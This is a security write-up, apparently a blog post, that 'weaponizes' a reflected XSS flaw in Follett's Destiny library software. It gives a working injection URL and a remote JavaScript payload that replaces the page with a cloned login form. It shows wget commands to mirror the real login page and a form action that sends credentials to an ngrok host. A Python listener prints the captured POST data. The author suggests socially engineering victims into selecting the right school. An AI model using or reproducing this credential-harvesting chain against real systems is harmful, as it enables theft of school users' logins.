## Reflected XSS Injection

The Destiny application by Follet Learning Solutions has a reflected XSS Injection in versions up to 20.0_1U. Today, I will provide the weaponization process of the Reflected XSS Injection to showcase how to abuse it.

Firstly, make sure your school ID has been set to the school that contains the search functions. It is in your cookie. You can socially engineer your victim to click on the proper school first anyways.

Reflected XSS - VERSION > 20.0_1
```
https://site.com/cataloging/servlet/handlewpesearchform.do?spotlightID=&themeID=&searchString=twode%3c%2ftitle%3e%3cscript%3ealert("Reflected XSS :)")%3c%2fscript%3eaaaaa&SearchWPE.x=0&SearchWPE.y=0
```

Now you will need to host your remote JS file. In this case, I will be replicating the login form so it displays that instead of the contents on the page.

```javascript
document.addEventListener("DOMContentLoaded", function() {
//hide first body - stops browser from flashing
const body = document.body;
body.style.display = 'none';  

// this was super hacky work around as multiple IDs shouldn't exist.
function hideFirstElementWithId(id) {
    var elements = document.querySelectorAll(`#${id}`);
    if (elements.length = 0) {
        elements[0].style.display = 'none';
    }
}


var request = new XMLHttpRequest();

// Open a new connection, using the GET request on the URL endpoint
request.open('GET', 'https://xxxxxx.ngrok.app/login.html', true);

request.onload = function() {
  var data = this.response;
  var div = document.createElement('div');
  div.innerHTML = data;
  body.appendChild(div);
  body.style.display = 'block';
  hideFirstElementWithId('masterHeaderTable');
  hideFirstElementWithId('masterTable');
}

// Send request
request.send();
});
```

Login html will be the login form, let's go ahead and replicate it.

```javascript
wget --mirror            \
     --no-cookies        \
     --header  "Cookie: siteIDCookie=0; JSESSIONID=XXXX.destiny"     \
     --convert-links     \
     --wait=2            \
     -o log              \
     https://victim.com/common/servlet/presentloginform.do
```

Now that we have the presentloginform.do. Rename it to login.html and then change the HTML login form and point it to our ngrok instance.

```angular2html
<form name="common_servlet_LoginForm" method="post" action="https://XXXXX.ngrok.app/login.html/fetch.html" onsubmit="return submitInterceptor_0();">
```

Please make sure the above has the correct Interceptor ID at the end. It will be on the page.

Now we will want to serve the files.

```angular2html
ngrok http 9999
```

```python
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler, test
import sys

class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
        self.send_header('Access-Control-Allow-Origin', '*')
        SimpleHTTPRequestHandler.end_headers(self)
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        # Log the post_data or perform any other desired actions
        print("Received POST data:", post_data)
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 9999)
```

Start the custom python listener as provided.

``` 
https://victim.com/cataloging/servlet/handlewpesearchform.do?spotlightID=&themeID=&searchString=twode%3c%2ftitle%3e%3cscript src="https://xxxxx.ngrok.app/xss.js"%3eeaaaaa&SearchWPE.x=0&SearchWPE.y=0
```

Provided the victim has the proper school ID in their cookie, a login form will be presented instead of the intended page.

